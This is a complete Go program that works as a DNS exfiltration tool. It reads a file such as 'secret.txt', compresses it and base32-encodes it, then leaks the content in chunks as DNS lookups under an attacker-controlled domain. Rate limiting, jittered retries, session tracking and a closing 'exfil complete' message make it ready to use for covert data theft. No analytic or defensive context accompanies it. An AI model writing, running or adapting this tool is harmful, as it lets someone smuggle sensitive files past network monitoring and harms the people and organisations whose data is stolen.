package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/rand"
	"encoding/base32"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	mathrand "math/rand"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

func readAll(path string) ([]byte, error) {
	if path == "-" {
		return io.ReadAll(os.Stdin)
	}
	return os.ReadFile(path)
}

func chunkBytes(b []byte, size int) [][]byte {
	if size <= 0 {
		return [][]byte{b}
	}
	out := make([][]byte, 0, (len(b)+size-1)/size)
	for i := 0; i < len(b); i += size {
		j := i + size
		if j > len(b) {
			j = len(b)
		}
		out = append(out, b[i:j])
	}
	return out
}

func toLabel(s string) string {
	return strings.ToLower(s)
}

func validLabelSize(sz int) int {
	if sz > 63 {
		return 63
	}
	if sz < 1 {
		return 1
	}
	return sz
}

func validFQDN(name string) bool {
	return len(name) <= 255
}

func randSeqID() string {
	n, _ := rand.Int(rand.Reader, big.NewInt(1<<62))
	return fmt.Sprintf("%d", n)
}

func newResolver(dns string) *net.Resolver {
	if dns == "" {
		return net.DefaultResolver
	}
	parts := strings.Split(dns, ":")
	if len(parts) == 1 {
		parts = append(parts, "53")
	}
	addr := parts[0] + ":" + parts[1]
	d := &net.Dialer{}
	return &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return d.DialContext(ctx, "udp", addr)
		},
	}
}

func main() {
	domain := flag.String("domain", "", "target domain (required)")
	file := flag.String("file", "", "file path or '-' for stdin (required)")
	session := flag.String("session", fmt.Sprintf("%s", randSeqID()), "session id")
	name := flag.String("name", "", "original filename (optional)")
	compress := flag.Bool("compress", false, "gzip compress before base32")
	rate := flag.Int("rate", 60, "queries per minute (cap 600)")
	labelSize := flag.Int("label", 50, "chars per DNS label (<=63)")
	retries := flag.Int("retries", 3, "retries per label")
	timeoutMs := flag.Int("timeout", 3000, "per-lookup timeout ms")
	parallel := flag.Int("parallel", 4, "concurrency")
	verbose := flag.Bool("v", false, "verbose")
	dry := flag.Bool("dry-run", false, "do not perform DNS lookups, only print names")
	dns := flag.String("dns", "", "resolver ip[:port] to force (e.g. 1.1.1.1:53). default system resolver")
	continueOnError := flag.Bool("continue-on-error", false, "do not exit on failed labels; show summary")
	flag.Parse()

	if *domain == "" || *file == "" {
		fmt.Fprintln(os.Stderr, "usage: -domain attacker.com -file secret.txt ...")
		os.Exit(2)
	}

	if *rate < 1 {
		*rate = 1
	}
	if *rate > 600 {
		*rate = 600
	}
	*labelSize = validLabelSize(*labelSize)
	if *parallel < 1 {
		*parallel = 1
	}

	data, err := readAll(*file)
	if err != nil {
		log.Fatalf("read error: %v", err)
	}

	if *compress {
		var b bytes.Buffer
		gw := gzip.NewWriter(&b)
		if _, err := gw.Write(data); err != nil {
			log.Fatalf("gzip write error: %v", err)
		}
		if err := gw.Close(); err != nil {
			log.Fatalf("gzip close error: %v", err)
		}
		data = b.Bytes()
	}

	enc := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
	enc = toLabel(enc)
	chunks := chunkBytes([]byte(enc), *labelSize)
	total := len(chunks)

	interval := time.Minute / time.Duration(*rate)
	if interval < time.Millisecond {
		interval = time.Millisecond
	}

	sem := make(chan struct{}, *parallel)
	var wg sync.WaitGroup
	var failed int32
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	resolver := newResolver(*dns)

	prng := mathrand.New(mathrand.NewSource(time.Now().UnixNano()))
	decorrelatedJitter := func(prev, base, max time.Duration) time.Duration {
		if prev <= 0 {
			prev = base
		}
		n := base + time.Duration(prng.Int63n(int64(prev*3)))
		if n > max {
			return max
		}
		return n
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	send := func(ctx context.Context, name string, toResolver *net.Resolver) error {
		if !validFQDN(name) {
			return fmt.Errorf("fqdn too long: %d", len(name))
		}
		if *dry {
			if *verbose {
				log.Printf("[dry] %s", name)
			} else {
				fmt.Println(name)
			}
			return nil
		}
		lookupCtx, cancel := context.WithTimeout(ctx, time.Duration(*timeoutMs)*time.Millisecond)
		defer cancel()
		_, err := toResolver.LookupIPAddr(lookupCtx, name)
		return err
	}

	// signal handling
	sigch := make(chan os.Signal, 1)
	signal.Notify(sigch, os.Interrupt)
	go func() {
		<-sigch
		cancel()
	}()

	// send meta chunk seq=0: format meta|<total>|<filename_base32>
	metaLabel := ""
	if *name != "" {
		fnB32 := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(*name))
		fnB32 = toLabel(fnB32)
		metaLabel = fmt.Sprintf("meta|%d|%s", total, fnB32)
	} else {
		metaLabel = fmt.Sprintf("meta|%d|", total)
	}
	if len(metaLabel) > 62 {
		// if meta too long for a single label, truncate filename part
		parts := strings.SplitN(metaLabel, "|", 3)
		if len(parts) == 3 {
			short := parts[2]
			if len(short) > 40 {
				short = short[:40]
			}
			metaLabel = fmt.Sprintf("meta|%s|%s", parts[1], short)
		}
	}
	metaName := fmt.Sprintf("0.%s.%s.%s", toLabel(metaLabel), *session, *domain)
	if len(metaName) > 255 {
		log.Fatalf("meta fqdn too long: %d", len(metaName))
	}
	if err := send(ctx, metaName, resolver); err != nil {
		log.Printf("warning: meta send failed: %v", err)
	} else if *verbose {
		log.Printf("sent meta for session %s total=%d", *session, total)
	}

	// send data chunks (1..N)
	for i, chunk := range chunks {
		select {
		case <-ticker.C:
		case <-ctx.Done():
			break
		}
		seq := i + 1
		label := toLabel(string(chunk))
		name := fmt.Sprintf("%d.%s.%s.%s", seq, label, *session, *domain)
		if len(label) > 63 {
			log.Fatalf("constructed label too long for seq %d: %d", seq, len(label))
		}
		if len(name) > 255 {
			log.Fatalf("constructed fqdn too long for seq %d: %d", seq, len(name))
		}

		wg.Add(1)
		sem <- struct{}{}
		go func(name string, seq int) {
			defer wg.Done()
			defer func() { <-sem }()
			success := false
			prev := 100 * time.Millisecond
			base := 100 * time.Millisecond
			max := 10 * time.Second
			for r := 0; r < *retries; r++ {
				if ctx.Err() != nil {
					return
				}
				err := send(ctx, name, resolver)
				if err == nil {
					success = true
					break
				}
				sleep := decorrelatedJitter(prev, base, max)
				select {
				case <-time.After(sleep):
				case <-ctx.Done():
					return
				}
				prev = sleep
			}
			if !success {
				atomic.AddInt32(&failed, 1)
				if *verbose {
					log.Printf("failed label: %s", name)
				}
			} else {
				if *verbose {
					log.Printf("sent label %d/%d", seq, total)
				}
			}
		}(name, seq)
	}

	wg.Wait()

	doneName := fmt.Sprintf("done.%s.%s", *session, *domain)
	_ = send(ctx, doneName, resolver)

	cleanupName := fmt.Sprintf("cleanup.%s.%s", *session, *domain)
	_ = send(ctx, cleanupName, resolver)

	fails := int(atomic.LoadInt32(&failed))
	if fails > 0 {
		if *continueOnError {
			log.Printf("finished with %d failed labels (continue-on-error enabled)", fails)
			os.Exit(0)
		}
		log.Fatalf("finished with %d failed labels", fails)
	}
	log.Println("exfil complete")
}
